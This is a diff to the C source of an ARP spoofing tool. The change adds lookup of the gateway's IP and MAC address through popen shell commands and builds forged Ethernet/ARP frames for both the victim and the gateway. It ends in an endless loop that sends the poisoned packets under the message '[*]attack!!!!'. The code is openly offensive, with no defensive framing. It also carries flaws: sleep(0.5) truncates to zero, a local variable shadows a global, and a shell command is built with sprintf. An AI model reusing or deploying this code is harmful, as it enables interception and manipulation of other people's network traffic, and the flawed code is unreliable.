@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <unistd.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -10,15 +11,23 @@
 #include "packet.h"
 
 extern int GetMacflag;
+extern int GetGateMacflag;
 extern arphdr_t arp_attack_packet;
+extern struct sniff_ethernet et_gate_packet;
 extern struct sniff_ethernet et_attack_packet;
 
-void GetGateway(char* line[])
+void GetGateway(char* line, char* gate_line)
 {
-    char cmd [1000] = {0x0};
+    char cmd [1000] = {0,};
     sprintf(cmd,"/sbin/ip route | awk '/default/ {print $3}'");
     FILE* fp = popen(cmd, "r");
     fscanf(fp,"%s",line);
+    pclose(fp);
+
+    char cmd2 [1000] = {0,};
+    sprintf(cmd2,"arp -n | grep \"%s\"| awk '{print $3}'",line);
+    fp = popen(cmd2, "r");
+    fscanf(fp,"%s", gate_line);
     pclose(fp);
 }
 
@@ -29,10 +38,12 @@ void* arp_spoof_main(void* arg)
 	pcap_t *handle = pargv->handle;
 	char *target_ip = pargv->ip;
 
+	//two packet
 	u_char packet[1500] = {0,};
+
 	int packet_len = 0;
 	char buf[8192] = {0};
-	struct ifconf ifc = {0};
+	struct ifconf ifc = {0,};
 	struct ifreq *ifr = NULL;
 	int sck = 0;
 	int nInterfaces = 0;
@@ -42,11 +53,20 @@ void* arp_spoof_main(void* arg)
 	struct ifreq *item;
 	struct sockaddr *addr;
 	struct sniff_ethernet eth;
+	arphdr_t arp_attack_packet;
 
 	//[*]stage1 Get gateway IP address
 	char gateway[GATEWAY_LEN] = {0,};
-	char macaddress[MAC_LEN] = {0,};
-	GetGateway(gateway);
+	char gate_mac[100] = {0,};
+	GetGateway(gateway, gate_mac);
+	printf("gateway address: %s", gate_mac);
+	sscanf(gate_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
+		&et_gate_packet.ether_dhost[0],
+		&et_gate_packet.ether_dhost[1],
+		&et_gate_packet.ether_dhost[2],
+		&et_gate_packet.ether_dhost[3],
+		&et_gate_packet.ether_dhost[4],
+		&et_gate_packet.ether_dhost[5]);
 
 	//[*]stage2 Get my mac address and target mac address
 	printf("target address: %s \n", target_ip);
@@ -98,7 +118,6 @@ void* arp_spoof_main(void* arg)
 		}
 
 		/* display result */
-
 		sprintf(macp, " %02x:%02x:%02x:%02x:%02x:%02x",
 		(unsigned char)item->ifr_hwaddr.sa_data[0],
 		(unsigned char)item->ifr_hwaddr.sa_data[1],
@@ -110,12 +129,13 @@ void* arp_spoof_main(void* arg)
 	    for (j = 0; j < 6; ++j) {
 	    	eth.ether_shost[j] = item->ifr_hwaddr.sa_data[j];
 	    	et_attack_packet.ether_shost[j] = item->ifr_hwaddr.sa_data[j];
+	    	et_gate_packet.ether_shost[j] = item->ifr_hwaddr.sa_data[j];
 	    }
 		for (j = 0; j < 6; ++j) {
 			eth.ether_dhost[j] = '\xff';
 		}
-
 		printf("[*]ip: %s , mac: %s\n", ip, macp);
+		GetGateMacflag = 1;
 	}
 
 	eth.ether_type = htons(ETHERTYPE_ARP);
@@ -152,9 +172,8 @@ void* arp_spoof_main(void* arg)
 		if(GetMacflag == 1)
 			break;
 	}
-	printf("[*]get mac address \n");
 
-	//arp spoof attack
+	//victime arp spoof attack
 	memset(packet, 0, packet_len);
 	packet_len = 0;
 
@@ -183,6 +202,7 @@ void* arp_spoof_main(void* arg)
 	printf("[*]attack!!!!\n");
 	while(1)
 	{
+		sleep(0.5);
 		if(pcap_sendpacket(handle, packet, packet_len) != 0)
 		{
 			fprintf(stderr,"Error sending arp packet\n");
